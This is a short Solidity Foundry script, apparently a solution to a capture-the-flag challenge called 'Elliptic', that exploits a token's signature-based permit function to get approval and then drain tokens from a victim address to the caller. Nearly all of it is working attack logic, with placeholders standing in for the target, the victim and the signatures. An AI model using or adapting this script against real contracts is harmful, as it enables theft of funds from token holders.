// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Script.sol";

interface IEllipticToken {
    function permit(
        uint256 amount,
        address spender,
        bytes memory tokenOwnerSignature,
        bytes memory spenderSignature
    ) external;

    function transferFrom(address from, address to, uint256 amount) external;
}

contract EllipticExploit is Script {

    function run() external {
        address token = 0xTARGET;

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        IEllipticToken t = IEllipticToken(token);

        uint256 amount = 100 ether;

        // Replace with real signatures
        bytes memory ownerSig = hex"OWNER_SIGNATURE";
        bytes memory spenderSig = hex"SPENDER_SIGNATURE";

        // 1. Get approval
        t.permit(amount, msg.sender, ownerSig, spenderSig);

        // 2. Drain funds
        t.transferFrom(
            address(0xVICTIM),
            msg.sender,
            amount
        );

        vm.stopBroadcast();
    }
}